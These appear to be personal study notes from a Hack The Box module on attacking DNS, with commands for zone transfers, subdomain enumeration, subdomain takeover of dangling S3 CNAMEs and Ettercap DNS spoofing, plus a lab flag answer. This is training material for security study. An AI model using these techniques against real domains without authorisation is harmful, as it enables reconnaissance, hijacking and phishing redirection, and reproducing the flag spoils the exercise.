The [Domain Name System](https://www.cloudflare.com/learning/dns/what-is-dns/) (`DNS`) translates domain names (e.g., hackthebox.com) to the numerical IP addresses (e.g., 104.17.42.72). DNS is mostly `UDP/53`, but DNS will rely on `TCP/53` more heavily as time progresses. DNS has always been designed to use both UDP and TCP port 53 from the start, with UDP being the default, and falls back to using TCP when it cannot communicate on UDP, typically when the packet size is too large to push through in a single UDP packet.
## Enumeration
The Nmap `-sC` (default scripts) and `-sV` (version scan) options can be used to perform initial enumeration against the target DNS servers:
```shell-session
nmap -p53 -Pn -sV -sC 10.10.110.213

PORT    STATE  SERVICE     VERSION
53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
```

## DNS Zone Transfer
A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages. Since DNS comprises multiple DNS zones, DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server. Unless a DNS server is configured correctly (limiting which IPs can perform a DNS zone transfer), anyone can ask a DNS server for a copy of its zone information since DNS zone transfers do not require any authentication. In addition, the DNS service usually runs on a UDP port; however, when performing DNS zone transfer, it uses a TCP port for reliable data transmission.

An attacker could leverage this DNS zone transfer vulnerability to learn more about the target organization's DNS namespace, increasing the attack surface. For exploitation, we can use the `dig` utility with DNS query type `AXFR` option to dump the entire DNS namespaces from a vulnerable DNS server:

#### DIG - AXFR Zone Transfer
```shell
> dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
;; global options: +cmd
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN      AAAA    ::1
inlanefrieght.htb.         604800  IN      NS      localhost.
inlanefrieght.htb.         604800  IN      A       10.129.110.22
admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.110.213#53(10.129.110.213)
;; WHEN: Mon Oct 11 17:20:13 EDT 2020
;; XFR size: 8 records (messages 1, bytes 289)
```
This can also work : 
```shell
dig axfr inlanefrieght.htb @10.129.110.213
```

Tools like [Fierce](https://github.com/mschwager/fierce) can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer:
```shell
fierce --domain zonetransfer.me
```

## Domain Takeovers & Subdomain Enumeration
`Domain takeover` is registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.

Domain takeover is also possible with subdomains called `subdomain takeover`. A DNS's canonical name (`CNAME`) record is used to map different domains to a parent domain. Many organizations use third-party services like AWS, GitHub, Akamai, Fastly, and other content delivery networks (CDNs) to host their content. In this case, they usually create a subdomain and make it point to those services. For example,
```shell-session
sub.target.com.   60   IN   CNAME   anotherdomain.com
```

The domain name (e.g., `sub.target.com`) uses a CNAME record to another domain (e.g., `anotherdomain.com`). Suppose the `anotherdomain.com` expires and is available for anyone to claim the domain since the `target.com`'s DNS server has the `CNAME` record. In that case, anyone who registers `anotherdomain.com` will have complete control over `sub.target.com` until the DNS record is updated.

#### Subdomain Enumeration
Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like [Subfinder](https://github.com/projectdiscovery/subfinder). This tool can scrape subdomains from open sources like [DNSdumpster](https://dnsdumpster.com/). Other tools like [Sublist3r](https://github.com/aboul3la/Sublist3r) can also be used to brute-force subdomains by supplying a pre-generated wordlist:

```shell

./subfinder -d inlanefreight.com -v     

```

An excellent alternative is a tool called [Subbrute](https://github.com/TheRook/subbrute). This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.

#### Subbrute
```shell
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

The tool has found four subdomains associated with `inlanefreight.com`. Using the `nslookup` or `host` command, we can enumerate the `CNAME` records for those subdomains.

```shell
> host support.inlanefreight.com

support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```

The `support` subdomain has an alias record pointing to an AWS S3 bucket. However, the URL `https://support.inlanefreight.com` shows a `NoSuchBucket` error indicating that the subdomain is potentially vulnerable to a subdomain takeover. Now, we can take over the subdomain by creating an AWS S3 bucket with the same subdomain name.

The [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) repository is also an excellent reference for a subdomain takeover vulnerability. It shows whether the target services are vulnerable to a subdomain takeover and provides guidelines on assessing the vulnerability.

## DNS Spoofing
DNS spoofing is also referred to as DNS Cache Poisoning. This attack involves altering legitimate DNS records with false information so that they can be used to redirect online traffic to a fraudulent website. Example attack paths for the DNS Cache Poisoning are as follows:
- An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (`MITM`) attack.
- Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.

#### Local DNS Cache Poisoning
From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).

To exploit the DNS cache poisoning via `Ettercap`, we should first edit the `/etc/ettercap/etter.dns` file to map the target domain name (e.g., `inlanefreight.com`) that they want to spoof and the attacker's IP address (e.g., `192.168.225.110`) that they want to redirect a user to:

```shell
> cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

Next, start the `Ettercap` tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`. Once completed, add the target IP address (e.g., `192.168.152.129`) to Target1 and add a default gateway IP (e.g., `192.168.152.2`) to Target2.![[Pasted image 20251021152607.png]]

Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`. This sends the target machine with fake DNS responses that will resolve `inlanefreight.com` to IP address `192.168.225.110`:
![[Pasted image 20251021152651.png]]

After a successful DNS spoof attack, if a victim user coming from the target machine `192.168.152.129` visits the `inlanefreight.com` domain on a web browser, they will be redirected to a `Fake page` that is hosted on IP address `192.168.225.110`:

![[Pasted image 20251021152750.png]]


In addition, a ping coming from the target IP address `192.168.152.129` to `inlanefreight.com` should be resolved to `192.168.225.110` as well:
```cmd-session
C:\>ping inlanefreight.com

Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.225.110:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```


### Questions

1. Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.
```shell
> echo "10.129.229.9" > ./resolvers.txt
> ./subbrute.py -p inlanefreight.htb -s ./names.txt -r ./resolvers.txt
inlanefreight.htb,SOA,inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb,NS,ns.inlanefreight.htb.
hr.inlanefreight.htb,REFUSED,
helpdesk.inlanefreight.htb,A,10.129.10.20
ns.inlanefreight.htb,A,127.0.0.1

DNS Zone Transfer with subdomain:
> dig axfr @10.129.229.9 hr.inlanefreight.htb
hr.inlanefreight.htb.	604800	IN	TXT	"HTB{LUIHNFAS2871SJK1259991}"
```

---

# Latest DNS Vulnerabilities

Many well-known bug bounty platforms, such as [HackerOne](https://www.hackerone.com/), already explicitly list `Subdomain Takeover` as a bounty category. With a simple search, we can find several tools on GitHub, for example, that automate the discovery of vulnerable subdomains or help create Proof of Concepts (`PoC`) that can then be submitted to the bug bounty program of our choice or the affected company. RedHuntLabs did a [study](https://redhuntlabs.com/blog/project-resonance-wave-1.html) on this in 2020, and they found that over 400,000 subdomains out of 220 million were vulnerable to subdomain takeover. 62% of them belonged to the e-commerce sector.
### The Concept of the Attack

One of the biggest dangers of a subdomain takeover is that a phishing campaign can be launched that is considered part of the official domain of the target company. For example, customers would look at the link and see that the domain `customer-drive.inlanefreight.com` (which points to a nonexisting S3 bucket from AWS) is behind the official domain `inlanefreight.com` and trust it as a customer. However, the customers do not know that this page has been mirrored or created by an attacker to provoke a login by the company's customers, for example.

Therefore, if an attacker finds a `CNAME` record in the company's DNS records that points to a subdomain that no longer exists and returns an `HTTP 404 error`, this subdomain can most likely be taken over by us through the use of the third-party provider. A subdomain takeover occurs when a subdomain points to another domain using the CNAME record that does not currently exist. When an attacker registers this nonexistent domain, the subdomain points to the domain registration by us. By making a single DNS change, we make ourselves the owner of that particular subdomain, and after that, we can manage the subdomain as we choose.
